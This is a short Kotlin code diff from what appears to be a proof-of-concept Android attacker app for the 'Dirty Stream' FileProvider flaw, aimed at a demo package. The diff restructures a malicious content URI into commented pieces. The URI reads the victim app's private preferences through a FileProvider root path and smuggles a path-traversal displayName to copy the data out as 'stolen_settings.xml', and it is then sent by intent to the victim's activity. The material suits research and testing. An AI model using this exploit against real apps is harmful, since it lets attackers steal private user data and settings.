@@ -94,7 +94,14 @@ class MuseumActivity : ComponentActivity() {
         try {
             Log.d(TAG, "🔥 Initiating arbitrary file read attack...")
             val maliciousUri = Uri.parse(
-                "content://com.example.dirtystream.fileprovider/root/data/data/com.example.dirtystream/shared_prefs/com.example.dirtystream_preferences.xml?displayName=../../../../../../../../storage/emulated/0/Android/data/com.example.dirtystream/files/stolen_settings.xml"
+                        // 1. Accessing victim's FileProvider
+                "content://com.example.dirtystream.fileprovider/root" +
+
+                        // 2. Path to victim's private setting
+                        "/data/data/com.example.dirtystream/shared_prefs/com.example.dirtystream_preferences.xml?" +
+
+                        // 3. malicious payload:
+                        "displayName=../../../../../../../../storage/emulated/0/Android/data/com.example.dirtystream/files/stolen_settings.xml"
             )
             val attackIntent = Intent(Intent.ACTION_SEND).apply {
                 component = ComponentName("com.example.dirtystream", "com.example.dirtystream.MainActivity")
